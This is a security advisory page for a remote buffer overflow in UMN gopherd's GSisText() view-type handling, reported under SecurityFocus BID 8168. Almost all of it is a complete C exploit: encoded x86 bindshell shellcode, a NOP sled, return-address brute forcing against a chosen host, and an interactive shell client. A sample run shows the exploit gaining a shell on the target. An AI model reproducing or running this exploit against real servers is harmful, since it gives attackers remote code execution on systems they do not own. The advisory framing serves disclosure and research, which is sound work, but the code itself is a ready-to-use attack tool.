source: http://www.securityfocus.com/bid/8168/info

It has been reported that there is a buffer overflow condition present in gopherd that may be exploited remotely to execute arbitrary code. The affected component is said to be used for determining view-types for gopher objects.


/*[ UMN gopherd[2.x.x/3.x.x]: remote GSisText()/view buffer overflow. ]*
 *                                                                     *
 * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realhalo)           *
 *                                                                     *
 * three years since last audit, code is a little more secure.  but,   *
 * still found a few potentially exploitable situations.  this         *
 * exploits the GSisText() object function in gopherd.  the function   *
 * is used in determining view-type.  the function does not check the  *
 * length of the string, which is copied into a temporary 64 byte      *
 * buffer.  an example would look like this(including where to put the *
 * shellcode at):                                                      *
 *                                                                     *
 * "g\t+<long string>\t1\n<shellcode(256 character max)>\n"            *
 *                                                                     *
 * to exploit this, the request must start with a h, 0, 4, 5, 9, s, I, *
 * or g.  followed by a <tab>+<long string>.  to have a place to put   *
 * the shellcode, i appeneded a <tab>1, which makes gopherd wait for   *
 * another line before actually doing the overflow.                    *
 *                                                                     *
 * requirements(general):                                              *
 *  none.  no option to disable this, hard-coded upon compile.         *
 *                                                                     *
 * requirements(for this exploit):                                     *
 *  the server must be running linux/x86(what i made the exploit for). *
 *  gopherd must be started in the root directory "/", running with    *
 *  the -c command line option, or started as non-root.  any of those  *
 *  three situations will allow for successful exploitation.  this     *
 *  does not mean it is impossible to exploit otherwise.  but, gopherd *
 *  will be in a chroot()'d state.  and, as of the 2.4 kernel series,  *
 *  i have seen no such way to break chroot.  if it is desired to      *
 *  still run code, even in a limited environment, simply change the   *
 *  shellcode to your likings.                                         *
 *                                                                     *
 * bug location(gopher-3.0.5/object/GSgopherobj.c):                    *
 *  2088:boolean                                                       *
 *  2089:GSisText(GopherObj *gs, char *view)                           *
 *  2090:{                                                             *
 *  ...                                                                *
 *  2106:char viewstowage[64], *cp;                                    *
 *  2108:strcpy(viewstowage, view);                                    *
 *                                                                     *
 * vulnerable versions:                                                *
 *  v3.0.5, v3.0.4, v3.0.3, v3.0.2, v3.0.1, v3.0.0(-1),                *
 *  v2.3.1. (patch level 0 through 15/all 2.3.1 versions)              *
 *  (it is assumed versions before 2.3.1 are vulnerable as well)       *
 *                                                                     *
 * tested on platforms(with no code changes/offsets):                  *
 *  RedHat7.1, 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 2001 i686             *
 *  Mandrake9.1, 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686   *
 *  (tested on both v3.0.5, and v2.3.1 sources / no changes)           *
 *                                                                     *
 * example usage:                                                      *
 *  # cc xgopherd2k3-view.c -o xgopherd2k3-view                        *
 *  # ./xgopherd2k3-view localhost                                     *
 *  [*] UMN gopherd[2.x.x/3.x.x]: remote buffer overflow exploit.      *
 *  [*] "UMN gopherd remote GSisText()/view buffer overflow"           *
 *  [*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)               *
 *                                                                     *
 *  [*] target: localhost:70 - brute: 0xbfffe000-0xbfffffff            *
 *                                                                     *
 *  (. = 29 byte offset): ............................................ *
 *  .................................................................. *
 *  ................................................(hit shellcode!)   *
 *                                                                     *
 *  Linux localhost.localdomain 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 200$ *
 *  uid=13(gopher) gid=30(gopher) groups=0(root),1(bin),2(daemon),3(s$ *
 ***********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* using brute force method, don't change values.                 */
#define CODESIZE 256 /* big as it gets, or will fail.             */
#define EIPSIZE 128 /* 64 byte buffer, little overboard. :)       */
#define BASEADDR 0xbfffe000 /* starting address, should be ok.    */
#define ENDADDR 0xbfffffff /* address to stop at.                 */
#define TIMEOUT 10 /* connection timeout. (general)               */

/* globals. */
static char x86_exec[]= /* bindshell(45295)&, netric/S-poly. */
 "\x57\x5f\xeb\x11\x5e\x31\xc9\xb1\xc8\x80\x44\x0e\xff\x2b\x49"
 "\x41\x49\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x06\x95\x06\xb0"
 "\x06\x9e\x26\x86\xdb\x26\x86\xd6\x26\x86\xd7\x26\x5e\xb6\x88"
 "\xd6\x85\x3b\xa2\x55\x5e\x96\x06\x95\x06\xb0\x25\x25\x25\x3b"
 "\x3d\x85\xc4\x88\xd7\x3b\x28\x5e\xb7\x88\xe5\x28\x88\xd7\x27"
 "\x26\x5e\x9f\x5e\xb6\x85\x3b\xa2\x55\x06\xb0\x0e\x98\x49\xda"
 "\x06\x95\x15\xa2\x55\x06\x95\x25\x27\x5e\xb6\x88\xd9\x85\x3b"
 "\xa2\x55\x5e\xac\x06\x95\x06\xb0\x06\x9e\x88\xe6\x86\xd6\x85"
 "\x05\xa2\x55\x06\x95\x06\xb0\x25\x25\x2c\x5e\xb6\x88\xda\x85"
 "\x3b\xa2\x55\x5e\x9b\x06\x95\x06\xb0\x85\xd7\xa2\x55\x0e\x98"
 "\x4a\x15\x06\x95\x5e\xd0\x85\xdb\xa2\x55\x06\x95\x06\x9e\x5e"
 "\xc8\x85\x14\xa2\x55\x06\x95\x16\x85\x14\xa2\x55\x06\x95\x16"
 "\x85\x14\xa2\x55\x06\x95\x25\x3d\x04\x04\x48\x3d\x3d\x04\x37"
 "\x3e\x43\x5e\xb8\x60\x29\xf9\xdd\x25\x28\x5e\xb6\x85\xe0\xa2"
 "\x55\x06\x95\x15\xa2\x55\x06\x95\x5e\xc8\x85\xdb\xa2\x55\xc0"
 "\x6e";

/* functions. */
char *geteip(unsigned int);
char *getcode(void);
unsigned short gopher_connect(char *,unsigned short,
unsigned int);
void getshell(char *,unsigned short);
void printe(char *,short);

/* signal handlers. */
void sig_ctrlc(){printe("aborted",1);}
void sig_alarm(){printe("alarm/timeout hit",1);}

/* begin. */
int main(int argc,char **argv){
 unsigned short gopher_port=70; /* default. */
 unsigned int offset=0,i=0;
 char *gopher_host;
 printf("[*] UMN gopherd[2.x.x/3.x.x]: remote buffer o"
 "verflow exploit.\n[*] \"UMN gopherd remote GSisText("
 ")/view buffer overflow\"\n[*] by: vade79/v9 v9@fakeh"
 "alo.deadpig.org (fakehalo)\n\n");
 if(argc<2){
  printf("[!] syntax: %s <hostname[:port]>\n\n",argv[0]);
  exit(1);
 }
 if(!(gopher_host=(char *)strdup(argv[1])))
  printe("main(): allocating memory failed",1);
 for(i=0;i<strlen(gopher_host);i++)
  if(gopher_host[i]==':')
   gopher_host[i]=0x0;
 if(index(argv[1],':'))
  gopher_port=atoi((char *)index(argv[1],':')+1);
 if(!gopher_port)
  gopher_port=70;
 printf("[*] target: %s:%d - brute: 0x%.8x-0x%.8x\n\n",
 gopher_host,gopher_port,BASEADDR,ENDADDR);
 signal(SIGINT,sig_ctrlc);
 signal(SIGALRM,sig_alarm);
 fprintf(stderr,"(. = 29 byte offset): ");
 for(offset=0;(BASEADDR+offset)<ENDADDR;offset+=29){
  fprintf(stderr,(gopher_connect(gopher_host,gopher_port,
  offset)?"!":"."));
  getshell(gopher_host,45295); /* defined in shellcode. */
 }
 fprintf(stderr,"(brute force limit hit)\n");
 exit(0);
}
char *geteip(unsigned int offset){
 unsigned int i=0;
 char *buf;
 if(!(buf=(char *)malloc(EIPSIZE+1)))
  printe("ftpd_read(): allocating memory failed.",1);
 memset(buf,0x0,EIPSIZE+1);
 for(i=0;i<EIPSIZE;i+=4){*(long *)&buf[i]=(BASEADDR+offset);}  
 return(buf);
}
char *getcode(void){
 char *buf;
 if(!(buf=(char *)malloc(CODESIZE+1)))
  printe("getcode(): allocating memory failed",1);
 memset(buf,0x90,(CODESIZE-strlen(x86_exec)));
 memcpy(buf+(CODESIZE-strlen(x86_exec)),x86_exec,
 strlen(x86_exec));
 return(buf);
}
unsigned short gopher_connect(char *hostname,
unsigned short port,unsigned int offset){
 int sock;
 struct hostent *t;
 struct sockaddr_in s;
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname))){
   close(sock);
   return(1);
  }
  memcpy((char*)&s.sin_addr,(char*)t->h_addr, 
  sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s))){
  alarm(0);
  close(sock);
  return(1);
 }
 alarm(0);
 usleep(500000); /* had problems, without a delay here. */
 /* the exploit itself. */
 dprintf(sock,"g\t+%s\t1\n",geteip(offset)); /* 64 bytes. */
 dprintf(sock,"%s\n",getcode()); /* 256 bytes room.       */
 usleep(500000);
 close(sock); /* done. */
 return(0);
}
/* same getshell() routine, a little modded for brute. */
void getshell(char *hostname,unsigned short port){
 int sock,r;
 fd_set fds;
 char buf[4096+1];
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)  
  return;
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname))){
   close(sock);
   return;
  }
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  alarm(0);
  close(sock);
  return;
 }
 alarm(0);
 fprintf(stderr,"(hit shellcode!)\n\n");
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id\n",13);
 while(1){   
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1){
   printe("getshell(): select() failed",0);
   return;
  }
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,4096))<1){
    printe("getshell(): read() failed",0);   
    return;
   }
   if(write(sock,buf,r)!=r){
    printe("getshell(): write() failed",0);
    return;
   }
  } 
  if(FD_ISSET(sock,&fds)){ 
   if((r=read(sock,buf,4096))<1)
    exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 fprintf(stderr,"(error: %s)\n",err);
 if(e)
  exit(1);
 return;
}